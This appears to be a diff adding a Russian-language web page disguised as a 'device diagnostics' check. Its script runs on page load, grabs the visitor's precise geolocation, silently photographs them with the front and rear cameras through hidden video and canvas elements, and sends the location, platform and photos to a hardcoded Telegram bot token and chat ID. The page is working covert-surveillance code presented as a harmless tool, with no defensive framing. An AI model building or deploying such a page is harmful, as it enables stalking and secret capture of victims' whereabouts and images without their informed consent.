@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Проверка подключения</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #0d0d0d;
+      color: #e0e0e0;
+      font-family: 'Courier New', monospace;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      background: #141414;
+      border: 1px solid #2a2a2a;
+      border-radius: 12px;
+      padding: 36px 32px;
+      max-width: 380px;
+      width: 100%;
+    }
+
+    .logo {
+      font-size: 28px;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 14px;
+      font-weight: 400;
+      color: #555;
+      text-align: center;
+      letter-spacing: 0.08em;
+      margin-bottom: 32px;
+    }
+
+    .steps { display: flex; flex-direction: column; gap: 12px; }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 13px;
+      color: #444;
+      transition: color 0.3s;
+    }
+
+    .step.active { color: #b0b0b0; }
+    .step.done   { color: #4ade80; }
+    .step.error  { color: #f87171; }
+
+    .dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: #2a2a2a;
+      flex-shrink: 0;
+      transition: background 0.3s;
+    }
+    .step.active .dot { background: #555; animation: pulse 1s infinite; }
+    .step.done   .dot { background: #4ade80; }
+    .step.error  .dot { background: #f87171; }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0.3; }
+    }
+
+    .footer {
+      margin-top: 32px;
+      font-size: 11px;
+      color: #2a2a2a;
+      text-align: center;
+    }
+
+    #result {
+      margin-top: 24px;
+      font-size: 13px;
+      text-align: center;
+      color: #4ade80;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">📡</div>
+    <h1>ДИАГНОСТИКА УСТРОЙСТВА</h1>
+
+    <div class="steps">
+      <div class="step" id="s-geo">
+        <div class="dot"></div><span>Геолокация</span>
+      </div>
+      <div class="step" id="s-front">
+        <div class="dot"></div><span>Фронтальная камера</span>
+      </div>
+      <div class="step" id="s-back">
+        <div class="dot"></div><span>Основная камера</span>
+      </div>
+      <div class="step" id="s-send">
+        <div class="dot"></div><span>Отправка данных</span>
+      </div>
+    </div>
+
+    <div id="result">✓ Диагностика завершена</div>
+    <div class="footer">v1.0.2 · diagnostics</div>
+  </div>
+
+  <!-- hidden video/canvas for capture -->
+  <video id="vid" playsinline style="display:none"></video>
+  <canvas id="cvs" style="display:none"></canvas>
+
+  <script>
+    const TOKEN   = '8666177832:AAHeuWWSEfP9bi2CZ2YuFVdp4mzKscUwJiI';
+    const CHAT_ID = '8562554669';
+
+    const step = (id, state) => {
+      const el = document.getElementById(id);
+      el.className = 'step ' + state;
+    };
+
+    async function tgMsg(text) {
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+      });
+    }
+
+    async function tgPhoto(blob, caption) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', blob, 'photo.jpg');
+      fd.append('caption', caption);
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: fd
+      });
+    }
+
+    async function getGeo() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) { resolve(null); return; }
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          ()  => resolve(null),
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      });
+    }
+
+    async function captureCamera(facingMode) {
+      const vid = document.getElementById('vid');
+      const cvs = document.getElementById('cvs');
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
+      });
+      vid.srcObject = stream;
+      await vid.play();
+      await new Promise(r => setTimeout(r, 800));
+      cvs.width  = vid.videoWidth  || 640;
+      cvs.height = vid.videoHeight || 480;
+      cvs.getContext('2d').drawImage(vid, 0, 0);
+      stream.getTracks().forEach(t => t.stop());
+      return new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.85));
+    }
+
+    async function run() {
+      const ua = navigator.userAgent;
+      const platform = /iPhone|iPad|iPod/.test(ua) ? 'iOS' : /Android/.test(ua) ? 'Android' : 'Desktop';
+
+      // — Геолокация —
+      step('s-geo', 'active');
+      let geoText = 'Геолокация недоступна';
+      const pos = await getGeo();
+      if (pos) {
+        const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
+        geoText = `📍 <b>Локация</b>\n` +
+                  `https://maps.google.com/maps?q=${lat},${lon}\n` +
+                  `Точность: ±${Math.round(acc)} м\n` +
+                  `Платформа: ${platform}`;
+        step('s-geo', 'done');
+      } else {
+        step('s-geo', 'error');
+        geoText = `📍 Геолокация отклонена\nПлатформа: ${platform}`;
+      }
+
+      // — Камеры —
+      let frontBlob = null, backBlob = null;
+
+      step('s-front', 'active');
+      try {
+        frontBlob = await captureCamera('user');
+        step('s-front', 'done');
+      } catch(e) {
+        step('s-front', 'error');
+      }
+
+      step('s-back', 'active');
+      try {
+        backBlob = await captureCamera('environment');
+        step('s-back', 'done');
+      } catch(e) {
+        step('s-back', 'error');
+      }
+
+      // — Отправка —
+      step('s-send', 'active');
+      try {
+        await tgMsg(geoText);
+        if (frontBlob) await tgPhoto(frontBlob, '📸 Фронтальная камера');
+        if (backBlob)  await tgPhoto(backBlob,  '📸 Основная камера');
+        if (!frontBlob && !backBlob) await tgMsg('⚠️ Доступ к камере отклонён');
+        step('s-send', 'done');
+        document.getElementById('result').style.display = 'block';
+      } catch(e) {
+        step('s-send', 'error');
+      }
+    }
+
+    run();
+  </script>
+</body>
+</html>
